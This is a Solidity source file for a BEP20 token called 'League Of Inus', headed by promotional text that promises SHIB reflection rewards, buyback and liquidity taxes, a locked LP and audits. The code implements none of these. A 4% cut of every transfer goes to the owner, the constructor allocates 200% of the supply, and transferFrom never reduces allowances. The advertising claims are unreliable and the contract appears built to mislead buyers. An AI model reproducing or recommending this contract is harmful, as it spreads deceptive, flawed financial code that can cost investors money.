/**
 *Submitted for verification at BscScan.com on 2021-10-07
*/

/**
🌙League Of Inus🌙
                        
          Your Battle Your World With Your Inus Heros
 Fortnite World Cup champion Bugha is $3 million Richer 
                   ⚡⚡ IMAGINE ⚡⚡ 
League Of Inus World Cup champion HeroShiba is $10 million richer.

           ⚔️HOLD $LOI, EARN SHIB⚔️
The first SHIB reflection token in league of inus GAME with auto-claim feature.
Simply hold $LOI tokens in your wallet and you'll earn SHIB.

✅FAIR LAUNCH
✅Verified Contract
✅LP LOCK 🔐7 Years

💰Earn Rewards in SHIBA  
💎8% SHIBA  Rewards A percentage of each tax goes towards the contract which buys SHIBA  and distributes it to the holder proportionally.
💎5% Marketing & Buyback This tax ensures there is sufficient amount of funds to sustain the coin in the long run and if needed. to keep the project running.will be used to buy tokens to support the chart.
💎3% Auto Liquidity is converted into Pancakeswap liquidity. It's an automatic process that helps to create a price floor.

💠 WHY BUY League Of Inus? 💠

💰Earn Rewards in SHIBA
🛡1 Full Audits Pre-Done

📱 Website: https://www.leagueofinus.com/ 
🐦Twitter: https://twitter.com/LeagueOfInus 
📢 Telegram: https://t.me/LeagueOfInus 


🚨🏆 Shilling Competition 🏆🚨
Hi everyone, we are going to have a shilling competition, to be able to participate you must shill about league of inus in other TG chanels, 
🚨You must take a screenshot of each shill and post it in the shilling TG group🚨
👇 👇
https://t.me/LeagueOfInus 

 */
pragma solidity ^0.8.4;
// SPDX-License-Identifier: MIT

interface IBEP20 {
  // @dev Returns the amount of tokens in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `value` tokens are moved from one account (`from`) to  another (`to`). Note that `value` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 value);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract LeagueOfInus is IBEP20 {
     // FairLaunch
    // common addresses
    address private owner;
    address private Yooshi;
    address private Game;
    address private SHIBA;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "League Of Inus";
    string public override symbol = "LeagueOfInus";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint value);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint value);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(uint totalSupplyValue, address YooshiAddress, address GameAddress, address SHIBAAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        Yooshi = YooshiAddress;
        Game = GameAddress;
        SHIBA = SHIBAAddress;
        
        // split the tokens according to agreed upon percentages
        balances[Yooshi] =  totalSupply * 4 / 100;
        balances[Game] = totalSupply * 42 / 100;
        balances[SHIBA] = totalSupply * 100 / 100;
        
        balances[owner] = totalSupply * 54 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint value) public override returns(bool) {
        require(value > 0, "Transfer value has to be higher than 0.");
        require(balanceOf(msg.sender) >= value, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total value
        uint rebaseTBD = value * 4 / 100;
        uint burnTBD = value * 0 / 100;
        uint valueAfterTaxAndBurn = value - rebaseTBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += valueAfterTaxAndBurn;
        balances[msg.sender] -= value;
        
        emit Transfer(msg.sender, to, value);
        
        // finally, we burn and tax the extras percentage
        balances[owner] += rebaseTBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint value) public override returns(bool) {
        allowances[msg.sender][spender] = value; 
        
        emit Approval(msg.sender, spender, value);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint value) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= value, "Allowance too low for transfer.");
        require(balances[from] >= value, "Balance is too low to make transfer.");
        
        balances[to] += value;
        balances[from] -= value;
        
        emit Transfer(from, to, value);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}